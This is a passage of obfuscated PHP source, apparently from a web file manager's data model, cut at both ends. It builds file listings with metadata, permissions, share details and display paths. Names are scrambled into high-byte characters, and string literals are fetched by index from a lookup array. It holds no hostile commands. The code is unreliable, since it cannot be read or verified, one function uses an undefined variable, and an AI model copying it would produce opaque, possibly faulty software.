== $äò ÚÓü[561]) { $®á™Š®î[$äò ÚÓü[460]] = $äò ÚÓü[562]; } $ù «İ÷”[$®á™Š®î[$äò ÚÓü[192]]][$®á™Š®î[$äò ÚÓü[95]]] = $®á™Š®î[$äò ÚÓü[460]]; } foreach ($Ò®Çè¡¥ as &$©äö˜§) { $©äö˜§[$äò ÚÓü[563]] = !1; if (isset($ù «İ÷”[$©äö˜§[$äò ÚÓü[192]]])) { $©äö˜§[$äò ÚÓü[563]] = $ù «İ÷”[$©äö˜§[$äò ÚÓü[192]]]; } if ($this->fileIsLock($©äö˜§) && $©äö˜§[$äò ÚÓü[510]]) { $’³öø ø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $©äö˜§[$äò ÚÓü[510]][$äò ÚÓü[511]] = AuthModel::authDisable($©äö˜§[$äò ÚÓü[510]][$äò ÚÓü[511]], $’³öø ø); $©äö˜§[$äò ÚÓü[510]][$äò ÚÓü[564]][$äò ÚÓü[510]] = $©äö˜§[$äò ÚÓü[510]][$äò ÚÓü[511]]; } } unset($©äö˜§); } protected function _listAppendFileMeta(&$êØ®ÅÊ®, $ß©¿Ğùâ) { $±Â§â”£ =& $_SERVER[‘ÆÜ‘œ]; $ùº©òØœ = array_to_keyvalue($êØ®ÅÊ®, $±Â§â”£[12], $±Â§â”£[565]); $ùº©òØœ = array_filter(array_unique($ùº©òØœ)); $ùº©òØœ = array_to_int($ùº©òØœ); if (!$ùº©òØœ) { return; } $šŠ»Úİè = array($±Â§â”£[566] => array($±Â§â”£[515], $ùº©òØœ)); $‰š‘¿‰ì = $±Â§â”£[567]; $ìéÇü = Model($±Â§â”£[568])->field($‰š‘¿‰ì)->where($šŠ»Úİè)->select(); $ìéÇü = array_to_keyvalue($ìéÇü, $±Â§â”£[565]); $¶Íœ Šş = Model($±Â§â”£[569])->field($±Â§â”£[570])->where($šŠ»Úİè)->select(); $¶Íœ Šş = $¶Íœ Šş ? $¶Íœ Šş : array(); $ôİ•£¢Ê = array(); foreach ($¶Íœ Šş as $Èõë¥ˆÆ) { if (!isset($ôİ•£¢Ê[$Èõë¥ˆÆ[$±Â§â”£[565]]])) { $ôİ•£¢Ê[$Èõë¥ˆÆ[$±Â§â”£[565]]] = array(); } $ôİ•£¢Ê[$Èõë¥ˆÆ[$±Â§â”£[565]]][$Èõë¥ˆÆ[$±Â§â”£[95]]] = $Èõë¥ˆÆ[$±Â§â”£[460]]; } foreach ($êØ®ÅÊ® as &$£ÇùÚ„„) { $ó¨õ = $£ÇùÚ„„[$±Â§â”£[565]]; if (!$ó¨õ || !is_array($ìéÇü[$ó¨õ])) { continue; } $£«Áøò = $ìéÇü[$ó¨õ]; $£«Áøò[$±Â§â”£[79]] = $£ÇùÚ„„[$±Â§â”£[79]]; $£«Áøò[$±Â§â”£[32]] = $£ÇùÚ„„[$±Â§â”£[32]]; if (!$£«Áøò[$±Â§â”£[571]]) { Model($±Â§â”£[568])->fileMd5Check($£«Áøò); } if (!isset(self::$cacheFileInfo[$±Â§â”£[572] . $ó¨õ])) { self::$cacheFileInfo[$±Â§â”£[572] . $ó¨õ] = array_merge(array(), $£«Áøò); } unset($ìéÇü[$ó¨õ][$±Â§â”£[87]]); $ õË”û = isset($ôİ•£¢Ê[$ó¨õ]) && is_array($ôİ•£¢Ê[$ó¨õ]) ? $ôİ•£¢Ê[$ó¨õ] : array(); $£ÇùÚ„„[$±Â§â”£[168]] = array_merge($ õË”û, $ìéÇü[$ó¨õ]); if (isset($£ÇùÚ„„[$±Â§â”£[168]][$±Â§â”£[183]])) { $£ÇùÚ„„[$±Â§â”£[183]] = json_decode($£ÇùÚ„„[$±Â§â”£[168]][$±Â§â”£[183]], !0); unset($£ÇùÚ„„[$±Â§â”£[168]][$±Â§â”£[183]]); } } unset($£ÇùÚ„„); } protected function _listAppendSourceInfo(&$”®ÍÌÕ, $©¹é¨¯Ğ) { $±öŒûÕá =& $_SERVER[‘ÆÜ‘œ]; $ÇÉ¨·Â = Model($±öŒûÕá[573])->listData(); $ÒÓñİÁ™ = Model($±öŒûÕá[522])->listData(); $ü¤º’àé = Model($±öŒûÕá[512])->listData(); $û­¹Í‹â = Model($±öŒûÕá[574])->listSimple(); $¶É¿€À = array_to_keyvalue($ÇÉ¨·Â, $±öŒûÕá[495]); $„“Çø‡ = array_to_keyvalue_group($ÒÓñİÁ™, $±öŒûÕá[87], $±öŒûÕá[523]); $Ûõ‡Ãúá = array_to_keyvalue($ü¤º’àé, $±öŒûÕá[87]); $ï·Ìâ“î = array_to_keyvalue_group($û­¹Í‹â, $±öŒûÕá[192]); foreach ($”®ÍÌÕ as &$¹´ğ¶Ÿ ) { $¹´ğ¶Ÿ [$±öŒûÕá[90]] = array($±öŒûÕá[575] => 0, $±öŒûÕá[576] => 0, $±öŒûÕá[577] => 0); if (isset($Ûõ‡Ãúá[$¹´ğ¶Ÿ [$±öŒûÕá[192]]])) { $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[578]] = 1; $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[579]] = $Ûõ‡Ãúá[$¹´ğ¶Ÿ [$±öŒûÕá[192]]][$±öŒûÕá[32]]; } if ($„“Çø‡ && $¶É¿€À && isset($„“Çø‡[$¹´ğ¶Ÿ [$±öŒûÕá[192]]])) { $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[580]] = array(); foreach ($„“Çø‡[$¹´ğ¶Ÿ [$±öŒûÕá[192]]] as $à—¸É§¼) { $ëæ† ™š = $¶É¿€À[$à—¸É§¼]; $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[580]][] = array($±öŒûÕá[581] => $ëæ† ™š[$±öŒûÕá[495]], $±öŒûÕá[517] => $ëæ† ™š[$±öŒûÕá[32]], $±öŒûÕá[582] => $ëæ† ™š[$±öŒûÕá[583]]); } } if ($ï·Ìâ“î && isset($ï·Ìâ“î[$¹´ğ¶Ÿ [$±öŒûÕá[192]]])) { $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[584]] = array(); foreach ($ï·Ìâ“î[$¹´ğ¶Ÿ [$±öŒûÕá[192]]] as $ÉÙÛ´á÷) { $¹´ğ¶Ÿ [$±öŒûÕá[90]][$±öŒûÕá[584]] = $this->shareFilterShow($ÉÙÛ´á÷); } } } unset($¹´ğ¶Ÿ ); return $”®ÍÌÕ; } protected function shareFilterShow($ªòÀ¯Ä¨) { $¯¡Â“µ =& $_SERVER[‘ÆÜ‘œ]; if (!$ªòÀ¯Ä¨) { return $ªòÀ¯Ä¨; } $ĞĞòîÒ = $¯¡Â“µ[585]; if ($ªòÀ¯Ä¨[$¯¡Â“µ[586]] == $¯¡Â“µ[91]) { $ĞĞòîÒ .= $¯¡Â“µ[587]; } if (is_array($ªòÀ¯Ä¨[$¯¡Â“µ[588]]) && is_array($ªòÀ¯Ä¨[$¯¡Â“µ[588]][$¯¡Â“µ[589]])) { $ªòÀ¯Ä¨[$¯¡Â“µ[588]][$¯¡Â“µ[589]] = $¯¡Â“µ[590]; } if (!$ç‘ĞşšÁ[$¯¡Â“µ[591]] && $ç‘ĞşšÁ[$¯¡Â“µ[192]] != $¯¡Â“µ[229]) { $ç‘ĞşšÁ[$¯¡Â“µ[591]] = KodIO::make($ç‘ĞşšÁ[$¯¡Â“µ[192]]); } $ªòÀ¯Ä¨ = array_field_key($ªòÀ¯Ä¨, explode($¯¡Â“µ[50], $ĞĞòîÒ)); return $ªòÀ¯Ä¨; } protected function _listAppendChildren(&$…Å•Ôã¹, $ˆ ›”şİ) { $Çéì¾Ø =& $_SERVER[‘ÆÜ‘œ]; $ş©ğıÏÖ = array(); $ÚşË¥çÑ = array($Çéì¾Ø[240] => 0, $Çéì¾Ø[241] => 0); foreach ($…Å•Ôã¹ as &$“ˆş Ôò) { if (!$“ˆş Ôò[$Çéì¾Ø[508]]) { continue; } $ş©ğıÏÖ[] = intval($“ˆş Ôò[$Çéì¾Ø[192]]); } unset($“ˆş Ôò); if (!$ş©ğıÏÖ) { return; } $íÙß­¿Š = array($Çéì¾Ø[191] => array($Çéì¾Ø[7], $ş©ğıÏÖ), $Çéì¾Ø[528] => 0); $¨·ƒ©»´ = array($Çéì¾Ø[191], $Çéì¾Ø[508], $Çéì¾Ø[592] => $Çéì¾Ø[593]); $‰®İ»ŸØ = $this->field($¨·ƒ©»´)->where($íÙß­¿Š)->group($Çéì¾Ø[594])->select(); $µˆï¥ÔÁ = array(); foreach ($‰®İ»ŸØ as $´”¿²¹) { $ã˜ŒõÜ = $´”¿²¹[$Çéì¾Ø[191]]; $Òé¶Î¹ª = $´”¿²¹[$Çéì¾Ø[508]] == $Çéì¾Ø[91] ? $Çéì¾Ø[241] : $Çéì¾Ø[240]; if (!isset($µˆï¥ÔÁ[$ã˜ŒõÜ])) { $µˆï¥ÔÁ[$ã˜ŒõÜ] = array($Çéì¾Ø[240] => 0, $Çéì¾Ø[241] => 0); } $µˆï¥ÔÁ[$ã˜ŒõÜ][$Òé¶Î¹ª] += $´”¿²¹[$Çéì¾Ø[593]]; } foreach ($…Å•Ôã¹ as &$“ˆş Ôò) { if (!$“ˆş Ôò[$Çéì¾Ø[508]]) { continue; } $‹ô…â‚Ú = is_array($µˆï¥ÔÁ[$“ˆş Ôò[$Çéì¾Ø[192]]]) ? $µˆï¥ÔÁ[$“ˆş Ôò[$Çéì¾Ø[192]]] : $ÚşË¥çÑ; $“ˆş Ôò[$Çéì¾Ø[241]] = $‹ô…â‚Ú[$Çéì¾Ø[241]]; $“ˆş Ôò[$Çéì¾Ø[240]] = $‹ô…â‚Ú[$Çéì¾Ø[240]]; unset($“ˆş Ôò[$Çéì¾Ø[509]]); } unset($“ˆş Ôò); } protected function _listAppendAuth(&$Ü¿’êºÁ) { $ÃÂ–Á =& $_SERVER[‘ÆÜ‘œ]; $üÚÏĞÏ™ = array(); foreach ($Ü¿’êºÁ as $Â´õŞ…Æ) { if ($Â´õŞ…Æ[$ÃÂ–Á[189]] == self::TYPE_GROUP) { $üÚÏĞÏ™[] = intval($Â´õŞ…Æ[$ÃÂ–Á[192]]); } } if (!$üÚÏĞÏ™) { return; } $øøãíË® = array_to_keyvalue($Ü¿’êºÁ, $ÃÂ–Á[192]); $Öé‚öëÆ = Model($ÃÂ–Á[595])->getSourceList($üÚÏĞÏ™, $øøãíË®); $Ôêı‹ê™ = KodUser::isRoot(); foreach ($Ü¿’êºÁ as $¶ª”èÉÂ => &$Â´õŞ…Æ) { $Â´õŞ…Æ[$ÃÂ–Á[510]] = $Öé‚öëÆ[$Â´õŞ…Æ[$ÃÂ–Á[192]]]; if (!$Â´õŞ…Æ[$ÃÂ–Á[510]] && $Â´õŞ…Æ[$ÃÂ–Á[189]] == self::TYPE_GROUP) { $Â´õŞ…Æ[$ÃÂ–Á[510]] = Action($ÃÂ–Á[596])->pathGroupAuthMake($Â´õŞ…Æ[$ÃÂ–Á[597]]); if (!$Â´õŞ…Æ[$ÃÂ–Á[510]] && !$Ôêı‹ê™) { $Â´õŞ…Æ[$ÃÂ–Á[234]] = !1; $Â´õŞ…Æ[$ÃÂ–Á[233]] = !1; } } if ($Â´õŞ…Æ[$ÃÂ–Á[510]]) { $Â´õŞ…Æ[$ÃÂ–Á[234]] = AuthModel::authCheckEdit($Â´õŞ…Æ[$ÃÂ–Á[510]][$ÃÂ–Á[511]]); $Â´õŞ…Æ[$ÃÂ–Á[233]] = AuthModel::authCheckView($Â´õŞ…Æ[$ÃÂ–Á[510]][$ÃÂ–Á[511]]); } $this->groupPathDisplay($Â´õŞ…Æ); } unset($Â´õŞ…Æ); } public function _listAppendAuthSecret(&$ÚÕ…ó ˜) { $ÓàÁ³‚Ş =& $_SERVER[‘ÆÜ‘œ]; if (Model($ÓàÁ³‚Ş[530])->get($ÓàÁ³‚Ş[598]) != $ÓàÁ³‚Ş[91]) { return; } static $ÂŠ®ûÂ = false; if (!$ÂŠ®ûÂ) { $”ÏöÇëÉ = Model($ÓàÁ³‚Ş[599]); $±ğ¼Åë = Model($ÓàÁ³‚Ş[600]); $ÂŠ®ûÂ = $±ğ¼Åë->listData(); $ÂŠ®ûÂ = array_to_keyvalue($ÂŠ®ûÂ, $ÓàÁ³‚Ş[192]); $´Šîº¸ = json_decode(Model($ÓàÁ³‚Ş[530])->get($ÓàÁ³‚Ş[601]), !0); $´Šîº¸ = array_to_keyvalue($´Šîº¸, $ÓàÁ³‚Ş[495]); foreach ($ÂŠ®ûÂ as $¥‰Ôß => $‚Á×÷£) { $Íˆùú×ƒ = $´Šîº¸[$‚Á×÷£[$ÓàÁ³‚Ş[602]]]; if (!$Íˆùú×ƒ) { $±ğ¼Åë->remove($‚Á×÷£[$ÓàÁ³‚Ş[495]]); unset($ÂŠ®ûÂ[$¥‰Ôß]); continue; } $ ÜÜ´£ = $”ÏöÇëÉ->listData($Íˆùú×ƒ[$ÓàÁ³‚Ş[510]]); if (!$ ÜÜ´£) { $±ğ¼Åë->remove($‚Á×÷£[$ÓàÁ³‚Ş[495]]); unset($ÂŠ®ûÂ[$¥‰Ôß]); continue; } $‚Á×÷£[$ÓàÁ³‚Ş[510]] = $ ÜÜ´£; $‚Á×÷£[$ÓàÁ³‚Ş[603]] = $Íˆùú×ƒ; $‚Á×÷£[$ÓàÁ³‚Ş[604]] = Model($ÓàÁ³‚Ş[605])->getInfoSimpleOuter($‚Á×÷£[$ÓàÁ³‚Ş[549]]); $ÂŠ®ûÂ[$¥‰Ôß] = $‚Á×÷£; } } $ïŸ©Ú = USER_ID; $äÅ¦ßñó = array(); $’öèÇï‰ = $this->_listAppendPath($äÅ¦ßñó, !0); foreach ($ÚÕ…ó ˜ as $¥‰Ôß => &$‚Á×÷£) { if (!is_array($‚Á×÷£[$ÓàÁ³‚Ş[510]])) { continue; } if ($‚Á×÷£[$ÓàÁ³‚Ş[189]] != $ÓàÁ³‚Ş[606]) { continue; } if (isset($ÂŠ®ûÂ[$‚Á×÷£[$ÓàÁ³‚Ş[192]]])) { $û¤Çõ†¾ = $ÂŠ®ûÂ[$‚Á×÷£[$ÓàÁ³‚Ş[192]]]; if (!is_array($‚Á×÷£[$ÓàÁ³‚Ş[563]])) { $‚Á×÷£[$ÓàÁ³‚Ş[563]] = array(); } $‚Á×÷£[$ÓàÁ³‚Ş[563]][$ÓàÁ³‚Ş[607]] = $û¤Çõ†¾[$ÓàÁ³‚Ş[602]]; $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[608]] = $û¤Çõ†¾; $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[609]] = $‚Á×÷£[$ÓàÁ³‚Ş[610]]; $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[611]] = $ÓàÁ³‚Ş[91]; if ($û¤Çõ†¾[$ÓàÁ³‚Ş[549]] != $ïŸ©Ú) { $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[511]] = $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[511]] & $û¤Çõ†¾[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[510]]; } continue; } $›•˜û¾û = $this->parentLevelArray($‚Á×÷£[$ÓàÁ³‚Ş[612]]); $ú¡Ã¸òø = array_reverse($›•˜û¾û); foreach ($ú¡Ã¸òø as $ìò’Ú­” => $×ü’Œ‚Î) { if (!isset($ÂŠ®ûÂ[$×ü’Œ‚Î])) { continue; } $û¤Çõ†¾ = $ÂŠ®ûÂ[$×ü’Œ‚Î]; $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[608]] = $û¤Çõ†¾; if ($û¤Çõ†¾[$ÓàÁ³‚Ş[549]] != $ïŸ©Ú) { $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[511]] = $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[511]] & $û¤Çõ†¾[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[510]]; } $óÈË€Ëñ = $ÓàÁ³‚Ş[12]; $¤ïÙê÷ = count($›•˜û¾û) - $ìò’Ú­”; for ($íÌÖš‘Ï = 0; $íÌÖš‘Ï < $¤ïÙê÷; $íÌÖš‘Ï++) { if (!isset($’öèÇï‰[$›•˜û¾û[$íÌÖš‘Ï]])) { $óÈË€Ëñ = $ÓàÁ³‚Ş[12]; break; } $óÈË€Ëñ = $óÈË€Ëñ . rtrim($’öèÇï‰[$›•˜û¾û[$íÌÖš‘Ï]], $ÓàÁ³‚Ş[8]) . $ÓàÁ³‚Ş[8]; } $‚Á×÷£[$ÓàÁ³‚Ş[510]][$ÓàÁ³‚Ş[609]] = rtrim($óÈË€Ëñ, $ÓàÁ³‚Ş[8]) . $ÓàÁ³‚Ş[8]; break; } } unset($‚Á×÷£); } public function groupPathDisplay(&$ÆÉ®Êì†) { $ù„òÍôü =& $_SERVER[‘ÆÜ‘œ]; if ($ÆÉ®Êì†[$ù„òÍôü[189]] != self::TYPE_GROUP) { return; } $©ê¡ó = Model($ù„òÍôü[613])->getInfo($ÆÉ®Êì†[$ù„òÍôü[597]]); $œÎø¨Âæ = $this->parentLevelArray($©ê¡ó[$ù„òÍôü[612]]); $ãÛıîÕ¬ = $ù„òÍôü[12]; foreach ($œÎø¨Âæ as $åˆùœ©¡) { $ä«ĞÅÙ = Model($ù„òÍôü[613])->getInfo($åˆùœ©¡); $ãÛıîÕ¬ .= $ä«ĞÅÙ[$ù„òÍôü[90]][$ù„òÍôü[192]] . $ù„òÍôü[50]; } $ÆÉ®Êì†[$ù„òÍôü[614]] = $©ê¡ó[$ù„òÍôü[191]]; $ÆÉ®Êì†[$ù„òÍôü[615]] = $©ê¡ó[$ù„òÍôü[612]]; $ÆÉ®Êì†[$ù„òÍôü[616]] = $©ê¡ó[$ù„òÍôü[617]]; $ÆÉ®Êì†[$ù„òÍôü[618]] = $ãÛıîÕ¬ . $©ê¡ó[$ù„òÍôü[90]][$ù„òÍôü[192]]; } protected function _listAppendPath(&$œ­‹˜‘ì, $€Ş äİ¼ = false) { $ùÓÎóí =& $_SERVER[‘ÆÜ‘œ]; static $½å±ëÂí = array(); $±ÈÊÖœ¦ = array(); $ğ÷ìâıÚ = array(); if ($€Ş äİ¼) { return $½å±ëÂí; } foreach ($œ­‹˜‘ì as &$ó¦”õÛÚ) { $¯ª˜¡¯² = $ó¦”õÛÚ[$ùÓÎóí[192]]; if ($ó¦”õÛÚ[$ùÓÎóí[508]] == $ùÓÎóí[91] && $ó¦”õÛÚ[$ùÓÎóí[191]] != 0) { $½å±ëÂí[$¯ª˜¡¯²] = $ó¦”õÛÚ[$ùÓÎóí[32]]; } if ($ó¦”õÛÚ[$ùÓÎóí[508]] == $ùÓÎóí[91] && $ó¦”õÛÚ[$ùÓÎóí[191]] == 0) { $½å±ëÂí[$¯ª˜¡¯²] = $this->_listAppendPathRoot($ó¦”õÛÚ, array()); } if (isset($ğ÷ìâıÚ[$ó¦”õÛÚ[$ùÓÎóí[612]]])) { continue; } $ğ÷ìâıÚ[$ó¦”õÛÚ[$ùÓÎóí[612]]] = !0; $î—ò‰—ø = $this->parentLevelArray($ó¦”õÛÚ[$ùÓÎóí[612]]); foreach ($î—ò‰—ø as $úºÎ§æ => $öş—ñíÛ) { if (isset($½å±ëÂí[$öş—ñíÛ])) { continue; } if ($úºÎ§æ == 0) { $½å±ëÂí[$öş—ñíÛ] = $this->_listAppendPathRoot($ó¦”õÛÚ, $î—ò‰—ø); } if ($úºÎ§æ != 0) { $±ÈÊÖœ¦[] = $öş—ñíÛ; } } } unset($ó¦”õÛÚ); $±ÈÊÖœ¦ = array_unique($±ÈÊÖœ¦); if (count($±ÈÊÖœ¦) > 0) { $ˆíîÄ‹ú = array($ùÓÎóí[514] => array($ùÓÎóí[515], $±ÈÊÖœ¦)); if (count($±ÈÊÖœ¦) == 1) { $—“Ä³Ş¤ = $this->sourceInfo($±ÈÊÖœ¦[0]); $Ç­¬ïÜª = is_array($—“Ä³Ş¤) ? array($—“Ä³Ş¤) : !1; } else { $Ç­¬ïÜª = $this->field($ùÓÎóí[619])->where($ˆíîÄ‹ú)->select(); } if (!$Ç­¬ïÜª) { $Ç­¬ïÜª = array(); } foreach ($Ç­¬ïÜª as $³·±Œ) { $½å±ëÂí[$³·±Œ[$ùÓÎóí[192]]] = $³·±Œ[$ùÓÎóí[32]]; } } $¼ã÷¬Ï = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€·‹ø‹ö = array(); foreach ($œ­‹˜‘ì as &$ó¦”õÛÚ) { $«¢îÇˆ = $ó¦”õÛÚ[$ùÓÎóí[612]]; $Ÿß‹äÆó = $ùÓÎóí[12]; if (isset($€·‹ø‹ö[$«¢îÇˆ])) { $Ÿß‹äÆó = $€·‹ø‹ö[$«¢îÇˆ]; } else { $î—ò‰—ø = $this->parentLevelArray($ó¦”õÛÚ[$ùÓÎóí[612]]); foreach ($î—ò‰—ø as $úºÎ§æ => $öş—ñíÛ) { if (isset($½å±ëÂí[$öş—ñíÛ])) { $Ÿß‹äÆó .= $½å±ëÂí[$öş—ñíÛ] . $ùÓÎóí[8]; } } $€·‹ø‹ö[$«¢îÇˆ] = $Ÿß‹äÆó; } $Ÿß‹äÆó .= $ó¦”õÛÚ[$ùÓÎóí[32]]; if ($ó¦”õÛÚ[$ùÓÎóí[508]] == $ùÓÎóí[91]) { $Ÿß‹äÆó .= $ùÓÎóí[8]; } $ó¦”õÛÚ[$ùÓÎóí[610]] = str_replace($ùÓÎóí[255], $ùÓÎóí[8], $Ÿß‹äÆó); if ($ó¦”õÛÚ[$ùÓÎóí[191]] == $ùÓÎóí[229]) { $ó¦”õÛÚ[$ùÓÎóí[32]] = trim($½å±ëÂí[$ó¦”õÛÚ[$ùÓÎóí[192]]], $ùÓÎóí[8]); $ó¦”õÛÚ[$ùÓÎóí[610]] = $ó¦”õÛÚ[$ùÓÎóí[32]] . $ùÓÎóí[8]; } if (intval($ó¦”õÛÚ[$ùÓÎóí[189]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ó¦”õÛÚ, $î—ò‰—ø, $¼ã÷¬Ï); } } unset($ó¦”õÛÚ); return $œ­‹˜‘ì; } private function _listAppendPathRecycle(&$ÎÌ¸°ùˆ, $êƒÔò„ò, $Óà¶‚àï) { $Ó¢ıÑ•ƒ =& $_SERVER[‘ÆÜ‘œ]; if (!in_array($Óà¶‚àï, $êƒÔò„ò) && $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[192]] != $Óà¶‚àï) { return; } $óûªŞ¼» = explode($Ó¢ıÑ•ƒ[8], trim($ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[610]], $Ó¢ıÑ•ƒ[8])); $¤áÌøÕ = implode($Ó¢ıÑ•ƒ[8], array_slice($óûªŞ¼», 2)); $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[610]] = $Ó¢ıÑ•ƒ[8] . LNG($Ó¢ıÑ•ƒ[620]) . $Ó¢ıÑ•ƒ[8] . ltrim($¤áÌøÕ, $Ó¢ıÑ•ƒ[8]); $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[612]] = $Ó¢ıÑ•ƒ[621] . implode($Ó¢ıÑ•ƒ[50], array_slice($êƒÔò„ò, 1)) . $Ó¢ıÑ•ƒ[50]; if ($ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[192]] == $Óà¶‚àï) { $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[612]] = $Ó¢ıÑ•ƒ[621]; $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[191]] = $Ó¢ıÑ•ƒ[229]; $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[32]] = LNG($Ó¢ıÑ•ƒ[620]); } $ÎÌ¸°ùˆ[$Ó¢ıÑ•ƒ[622]] = $Ó¢ıÑ•ƒ[623]; } protected function _listAppendPathRoot(&$¨™¨Æš¯, $ßÙÃŸçò) { $‚Í¹Ş¥‚ =& $_SERVER[‘ÆÜ‘œ]; static $š‚óãÊã = false; static $¨äÃ‡µ = false; $ÂÍö³»˜ = $‚Í¹Ş¥‚[12]; if ($¨™¨Æš¯[$‚Í¹Ş¥‚[189]] == self::TYPE_USER) { if ($¨™¨Æš¯[$‚Í¹Ş¥‚[597]] == USER_ID) { $ÂÍö³»˜ = LNG($‚Í¹Ş¥‚[624]); if ($š‚óãÊã === !1) { $Ğªªò€è = Model($‚Í¹Ş¥‚[625])->getInfoFull(USER_ID); $š‚óãÊã = _get($Ğªªò€è, $‚Í¹Ş¥‚[626], $‚Í¹Ş¥‚[12]); } if ($¨äÃ‡µ === !1) { $Ğªªò€è = Model($‚Í¹Ş¥‚[625])->getInfoFull(USER_ID); $¨äÃ‡µ = _get($Ğªªò€è, $‚Í¹Ş¥‚[627], $‚Í¹Ş¥‚[12]); } if ($ßÙÃŸçò && $ßÙÃŸçò[0] == $š‚óãÊã || !$ßÙÃŸçò && $¨™¨Æš¯[$‚Í¹Ş¥‚[192]] == $š‚óãÊã) { $ÂÍö³»˜ = LNG($‚Í¹Ş¥‚[628]); $¨™¨Æš¯[$‚Í¹Ş¥‚[629]] = $‚Í¹Ş¥‚[630]; } if ($ßÙÃŸçò && $ßÙÃŸçò[0] == $¨äÃ‡µ || !$ßÙÃŸçò && $¨™¨Æš¯[$‚Í¹Ş¥‚[192]] == $¨äÃ‡µ) { $ÂÍö³»˜ = $ÂÍö³»˜ . $‚Í¹Ş¥‚[631] . LNG($‚Í¹Ş¥‚[632]); } if (!$ßÙÃŸçò) { $¨™¨Æš¯[$‚Í¹Ş¥‚[32]] = $ÂÍö³»˜; } } else { $Ğªªò€è = Model($‚Í¹Ş¥‚[625])->getInfoFull($¨™¨Æš¯[$‚Í¹Ş¥‚[597]]); $ò´€ˆú¥ = _get($Ğªªò€è, $‚Í¹Ş¥‚[627], $‚Í¹Ş¥‚[12]); $¨™¨Æš¯[$‚Í¹Ş¥‚[633]] = Model($‚Í¹Ş¥‚[605])->getInfoSimpleOuter($¨™¨Æš¯[$‚Í¹Ş¥‚[597]]); $ÂÍö³»˜ = LNG($‚Í¹Ş¥‚[634]) . $‚Í¹Ş¥‚[174] . $¨™¨Æš¯[$‚Í¹Ş¥‚[633]][$‚Í¹Ş¥‚[32]] . $‚Í¹Ş¥‚[176]; if ($ßÙÃŸçò && $ßÙÃŸçò[0] == $ò´€ˆú¥ || !$ßÙÃŸçò && $¨™¨Æš¯[$‚Í¹Ş¥‚[192]] == $ò´€ˆú¥) { $ÂÍö³»˜ = LNG($‚Í¹Ş¥‚[634]) . $‚Í¹Ş¥‚[635] . $¨™¨Æš¯[$‚Í¹Ş¥‚[633]][$‚Í¹Ş¥‚[32]] . $‚Í¹Ş¥‚[631] . LNG($‚Í¹Ş¥‚[632]) . $‚Í¹Ş¥‚[176]; } } } else { if ($¨™¨Æš¯[$‚Í¹Ş¥‚[189]] == self::TYPE_GROUP) { $õõˆ¡®Õ = Model($‚Í¹Ş¥‚[613])->getInfoSimple($¨™¨Æš¯[$‚Í¹Ş¥‚[597]]); $ÂÍö³»˜ = $õõˆ¡®Õ[$‚Í¹Ş¥‚[32]]; } else { if ($¨™¨Æš¯[$‚Í¹Ş¥‚[189]] == self::TYPE_SYSTEM) { $ÂÍö³»˜ = $‚Í¹Ş¥‚[636]; } } } $ÂÍö³»˜ = $ÂÍö³»˜ ? $‚Í¹Ş¥‚[8] . $ÂÍö³»˜ . $‚Í¹Ş¥‚[8] : $‚Í¹Ş¥‚[8]; return $ÂÍö³»˜; } protected function _listAppendUser(&$õ¶‰ò™) { $Ê«°ÏÑë =& $_SERVER[‘ÆÜ‘œ]; $ó´Æ’È = array_to_keyvalue($õ¶‰ò™, $Ê«°ÏÑë[12], $Ê«°ÏÑë[549]); $ ƒúÇÌ = array_to_keyvalue($õ¶‰ò™, $Ê«°ÏÑë[12], $Ê«°ÏÑë[551]); $…”¤¯şõ = array_merge($ó´Æ’È, $ ƒúÇÌ); $‡ëı¶Ñ– = Model($Ê«°ÏÑë[625])->userListInfo($…”¤¯şõ); foreach ($õ¶‰ò™ as &$ãœ†Ù„±) { $¢¿¢ÊôÆ = $ãœ†Ù„±[$Ê«°ÏÑë[549]]; $ãœ†Ù„±[$Ê«°ÏÑë[549]] = $‡ëı¶Ñ–[$¢¿¢ÊôÆ] ? $‡ëı¶Ñ–[$¢¿¢ÊôÆ] : !1; $¢¿¢ÊôÆ = $ãœ†Ù„±[$Ê«°ÏÑë[551]]; $ãœ†Ù„±[$Ê«°ÏÑë[551]] = $‡ëı¶Ñ–[$¢¿¢ÊôÆ] ? $‡ëı¶Ñ–[$¢¿¢ÊôÆ] : !1; if (_get($ãœ†Ù„±, $Ê«°ÏÑë[637], 0)) { $º‹ÎÈ»¿ = $GLOBALS[$Ê«°ÏÑë[6]][$Ê«°ÏÑë[92]][$Ê«°ÏÑë[638]]; if ($ãœ†Ù„±[$Ê«°ÏÑë[563]][$Ê«°ÏÑë[639]] <= time() - $º‹ÎÈ»¿) { $this->metaSet($ãœ†Ù„±[$Ê«°ÏÑë[192]], $Ê«°ÏÑë[640], null); $this->metaSet($ãœ†Ù„±[$Ê«°ÏÑë[192]], $Ê«°ÏÑë[639], null); unset($ãœ†Ù„±[$Ê«°ÏÑë[563]][$Ê«°ÏÑë[640]]); continue; } $§şß÷ƒ = $ãœ†Ù„±[$Ê«°ÏÑë[563]][$Ê«°ÏÑë[640]]; $ãœ†Ù„±[$Ê«°ÏÑë[563]][$Ê«°ÏÑë[641]] = 